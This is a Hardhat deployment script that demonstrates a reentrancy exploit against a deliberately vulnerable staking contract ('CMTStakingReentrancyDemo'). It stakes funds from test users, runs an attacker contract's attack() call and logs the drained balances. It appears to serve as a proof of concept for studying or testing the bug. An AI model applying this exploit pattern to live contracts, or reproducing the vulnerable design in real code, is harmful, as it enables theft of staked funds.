const { assert } = require("chai");
const { ethers, upgrades } = require("hardhat");

async function main() {
    const [deployer, ...addrs] = await ethers.getSigners();

    console.log("Deploying contracts with the account:", deployer.address);
    console.log("Account balance:", (await deployer.getBalance()).toString());

    // deploy CMTStke with reentrancy bug
    const CMTStaking = await ethers.getContractFactory('CMTStakingReentrancyDemo');
    const validatorAddr = deployer.address;
    const initializeParams = [validatorAddr];
    const constructorParams = [ethers.utils.parseEther('0.0001')];
    console.log("Deploying CMTStake ...");
    console.log(`Initialize params: ${initializeParams}`);
    console.log(`Constructor params: ${constructorParams}`);
    const proxy = await upgrades.deployProxy(CMTStaking, initializeParams, { initializer: 'initialize', kind: 'uups', constructorArgs: constructorParams, unsafeAllow: ['state-variable-immutable'] });
    await proxy.deployed();
    console.log("CMTStake address", proxy.address);

    // deploy attacker contract
    const ReentrancyAttacker = await ethers.getContractFactory('ReentrancyAttacker');
    const reentrancyAttacker = await ReentrancyAttacker.deploy();
    await reentrancyAttacker.deployed();
    console.log(`Reentrancy Attacker: ${reentrancyAttacker.address}`);

    let tx;

    // normal users stake
    const user1 = addrs[0];
    tx = await proxy.connect(user1).stake(validatorAddr, { value: ethers.utils.parseEther("1") });
    await tx.wait();
    console.log(`user1: ${user1.address} staked ${ethers.utils.parseEther("1")}`);
    const user2 = addrs[1];
    tx = await proxy.connect(user2).stake(validatorAddr, { value: ethers.utils.parseEther("1") });
    await tx.wait();
    console.log(`user2: ${user2.address} staked ${ethers.utils.parseEther("1")}`);

    // CMTStake contract balance check
    console.log(`CMTStake contract balance: ${await ethers.provider.getBalance(proxy.address)}`);

    // attacker stake 1 eth
    tx = await reentrancyAttacker.stake(proxy.address, validatorAddr, { value: ethers.utils.parseEther("1") });
    await tx.wait();
    console.log(`attacker: ${reentrancyAttacker.address} staked ${ethers.utils.parseEther("1")}`);
    // console.log(await proxy.stakers(reentrancyAttacker.address));
    // console.log(await proxy.stakingRecords(reentrancyAttacker.address, validatorAddr, 0));

    // CMTStake contract balance check
    console.log(`CMTStake contract balance: ${await ethers.provider.getBalance(proxy.address)}`);

    // attack ...
    console.log(`before atack, reentrancyAttacker balance: ${await ethers.provider.getBalance(reentrancyAttacker.address)}`);
    tx = await reentrancyAttacker.attack(0, {gasLimit: 30000000});
    let confirm = await tx.wait();
    console.log(confirm.events[0].args);

    console.log(`after atack, reentrancyAttacker balance: ${await ethers.provider.getBalance(reentrancyAttacker.address)}`);
    console.log(`CMTStake contract balance: ${await ethers.provider.getBalance(proxy.address)}`);
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
